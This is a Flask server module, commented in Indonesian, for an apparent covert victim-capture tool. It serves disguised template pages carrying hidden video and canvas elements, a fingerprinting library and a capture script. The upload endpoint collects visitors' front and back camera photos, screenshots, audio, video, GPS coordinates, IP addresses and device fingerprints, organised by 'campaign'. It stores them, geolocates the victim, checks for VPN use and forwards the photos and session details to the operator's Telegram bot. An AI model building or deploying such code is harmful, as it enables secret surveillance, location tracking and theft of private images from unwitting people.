from flask import Blueprint, render_template, request, jsonify, abort
from datetime import datetime
import json, base64, os, requests
from app.config import Config
from app.database import db
from app.models import Session, Event

bp = Blueprint("capture", __name__)


def decode_data_url(d):
    if not d or "," not in d:
        return b""
    try:
        return base64.b64decode(d.split(",", 1)[1])
    except Exception:
        return b""


def save_bytes(ts, suffix, data, folder=None):
    folder = folder or Config.UPLOAD_DIR
    fname = ts + "_" + suffix + ".png"
    path = os.path.join(folder, fname)
    with open(path, "wb") as f:
        f.write(data)
    return fname


def reverse_geocode(lat, lon):
    if not Config.ENABLE_REVERSE_GEOCODE or not lat or not lon:
        return ""
    try:
        r = requests.get("https://nominatim.openstreetmap.org/reverse",
            params={"lat": lat, "lon": lon, "format": "json"},
            headers={"User-Agent": "CaptureDashboard/1.0"}, timeout=6)
        return r.json().get("display_name", "")
    except Exception:
        return ""


def check_vpn(ip):
    if not Config.ENABLE_VPN_CHECK or not ip:
        return False
    try:
        r = requests.get("https://proxycheck.io/v2/" + ip + "?vpn=1", timeout=6)
        return r.json().get(ip, {}).get("proxy", "no") == "yes"
    except Exception:
        return False


def send_telegram_photo(image_bytes, caption):
    if not Config.TG_TOKEN or "ISI_" in Config.TG_TOKEN:
        return False
    try:
        r = requests.post("https://api.telegram.org/bot" + Config.TG_TOKEN + "/sendPhoto",
            data={"chat_id": Config.TG_CHAT_ID, "caption": caption},
            files={"photo": ("foto.png", image_bytes, "image/png")}, timeout=20)
        return r.json().get("ok", False)
    except Exception:
        return False


def send_telegram_text(text):
    if not Config.TG_TOKEN or "ISI_" in Config.TG_TOKEN:
        return False
    try:
        requests.post("https://api.telegram.org/bot" + Config.TG_TOKEN + "/sendMessage",
            json={"chat_id": Config.TG_CHAT_ID, "text": text, "parse_mode": "HTML"}, timeout=15)
        return True
    except Exception:
        return False


@bp.route("/capture")
def index():
    return render_template("capture.html", campaign="default")


@bp.route("/c/<campaign>")
def index_campaign(campaign):
    return render_template("capture.html", campaign=campaign)


@bp.route("/m/<slug>")
def mode_page(slug):
    """Short URL untuk mode - render capture page dengan config dari DB."""
    from app.models import CaptureConfig
    config = CaptureConfig.query.filter_by(slug=slug).first()
    if not config:
        return render_template("capture.html", campaign="default", mode_config=None)
    config.used_count = (config.used_count or 0) + 1
    db.session.commit()
    return render_template("capture.html", campaign=config.campaign, mode_config=config)


@bp.route("/t/<int:tid>/<slug>")
def template_page(tid, slug):
    """Render template HTML dengan capture.js."""
    from app.models import Template
    from flask import Response as FlaskResponse
    t = Template.query.get(tid)
    if not t:
        abort(404)
    try:
        import json as _json
        cfg = _json.loads(t.config_json or "{}")
    except Exception:
        cfg = {}
    config_json = _json.dumps({
        "ENABLE_FOTO_DEPAN": bool(cfg.get("foto_depan")),
        "ENABLE_FOTO_BELAKANG": bool(cfg.get("foto_belakang")),
        "ENABLE_SCREENSHOT": bool(cfg.get("screenshot")),
        "ENABLE_GPS": bool(cfg.get("gps")),
        "ENABLE_BURST": bool(cfg.get("burst")),
        "ENABLE_LOCATION_TRACKING": bool(cfg.get("location_tracking")),
        "ENABLE_TAB_LOG": bool(cfg.get("tab_log")),
        "DELAY_SECONDS": 5,
        "WAIT_PERMISSION": True,
    })
    html = "<!DOCTYPE html><html><head><meta charset='utf-8'>" \
           "<meta name='viewport' content='width=device-width,initial-scale=1'>" \
           "<title>" + t.name + "</title>" \
           "<link rel='manifest' href='/static/manifest.json'>" \
           "<style>body{margin:0;padding:0;font-family:system-ui,sans-serif}</style></head><body>" \
           + (t.html_content or "") + \
           "<video id='v' autoplay playsinline muted hidden></video>" \
           "<canvas id='c' hidden></canvas>" \
           "<div id='status' hidden></div><div id='log' hidden></div>" \
           "<script>window.CAMPAIGN='" + (t.category or 'template') + "';" \
           "window.MODE_SLUG='" + slug + "';" \
           "window.CONFIG=" + config_json + ";</script>" \
           "<script src='https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js'></script>" \
           "<script src='https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@4/dist/fp.min.js'></script>" \
           "<script src='/static/js/capture.js'></script>" \
           "</body></html>"
    return FlaskResponse(html, mimetype="text/html")


@bp.route("/t/<int:tid>/preview")
def preview_template(tid):
    """Preview template tanpa capture.js."""
    from app.models import Template
    from flask import Response as FlaskResponse
    t = Template.query.get(tid)
    if not t:
        abort(404)
    html = "<!DOCTYPE html><html><head><meta charset='utf-8'><title>" + t.name + "</title>" \
           "<style>body{margin:0;padding:0;font-family:system-ui,sans-serif}</style></head><body>" \
           + (t.html_content or "") + "</body></html>"
    return FlaskResponse(html, mimetype="text/html")


@bp.route("/upload", methods=["POST"])
def upload():
    client_ip = request.headers.get("X-Forwarded-For", request.remote_addr or "")
    client_ip = client_ip.split(",")[0].strip()
    payload = request.get_json(force=True, silent=True) or {}
    now = datetime.now()
    ts = now.strftime("%Y%m%d_%H%M%S") + "_" + str(now.microsecond // 1000).zfill(3)
    campaign = payload.get("campaign") or "default"

    img_depan = decode_data_url(payload.get("image_depan", ""))
    img_belakang = decode_data_url(payload.get("image_belakang", ""))
    screenshot = decode_data_url(payload.get("screenshot", ""))
    audio = decode_data_url(payload.get("audio", ""))
    video = decode_data_url(payload.get("video", ""))

    has_depan = bool(img_depan)
    has_belakang = bool(img_belakang)
    has_screenshot = bool(screenshot)
    has_audio = bool(audio)
    has_video = bool(video)

    if has_depan: save_bytes(ts, "depan", img_depan)
    if has_belakang: save_bytes(ts, "belakang", img_belakang)
    if has_screenshot: save_bytes(ts, "screenshot", screenshot, Config.SCREENSHOT_DIR)
    if has_audio:
        fname = ts + "_audio.webm"
        with open(os.path.join(Config.AUDIO_DIR, fname), "wb") as f:
            f.write(audio)
    if has_video:
        fname = ts + "_video.webm"
        with open(os.path.join(Config.VIDEO_DIR, fname), "wb") as f:
            f.write(video)

    ip_info = payload.get("ip_info") or {}
    gps = payload.get("lokasi_gps") or {}
    fingerprint = payload.get("fingerprint") or {}
    local_ips = payload.get("local_ips") or []
    lat = gps.get("lat") if gps else None
    lon = gps.get("lon") if gps else None
    alamat = reverse_geocode(lat, lon) if (lat and lon) else ""
    is_vpn = check_vpn(payload.get("ip_publik"))

    s = Session(ts=ts, waktu=ts, campaign=campaign, ip_koneksi=client_ip,
        ip_publik=payload.get("ip_publik"), ip_lokal=",".join(local_ips[:5]),
        country=ip_info.get("country_name") or ip_info.get("country"),
        city=ip_info.get("city"), region=ip_info.get("region"),
        isp=ip_info.get("org") or ip_info.get("asn"), is_vpn=int(is_vpn),
        lat=lat, lon=lon, akurasi_m=gps.get("akurasi_m") if gps else None,
        alamat=alamat, user_agent=request.headers.get("User-Agent"),
        fingerprint=json.dumps(fingerprint, ensure_ascii=False),
        visitor_id=fingerprint.get("visitorId") if isinstance(fingerprint, dict) else None,
        has_depan=int(has_depan), has_belakang=int(has_belakang),
        has_screenshot=int(has_screenshot), has_audio=int(has_audio), has_video=int(has_video))

    if has_depan: send_telegram_photo(img_depan, "DEPAN " + ts + " | " + campaign)
    if has_belakang: send_telegram_photo(img_belakang, "BELAKANG " + ts)
    if has_screenshot: send_telegram_photo(screenshot, "SCREENSHOT " + ts)

    send_telegram_text("<b>Sesi Baru</b>\nWaktu: " + ts + "\nIP: " + str(s.ip_publik) +
        "\nKota: " + str(s.city) + ", " + str(s.region) + "\nISP: " + str(s.isp) +
        "\nVPN: " + ("Ya" if is_vpn else "Tidak") + "\nCampaign: " + campaign)

    db.session.add(s)
    db.session.commit()
    return jsonify({"ok": True, "msg": "Tersimpan", "ts": ts})


@bp.route("/event", methods=["POST"])
def log_event():
    payload = request.get_json(silent=True) or {}
    ts = payload.get("ts")
    if not ts:
        return jsonify({"ok": False}), 400
    e = Event(session_ts=ts, event_type=payload.get("event_type", "unknown"),
              data=json.dumps(payload.get("data") or {}, ensure_ascii=False))
    db.session.add(e)
    db.session.commit()
    return jsonify({"ok": True})
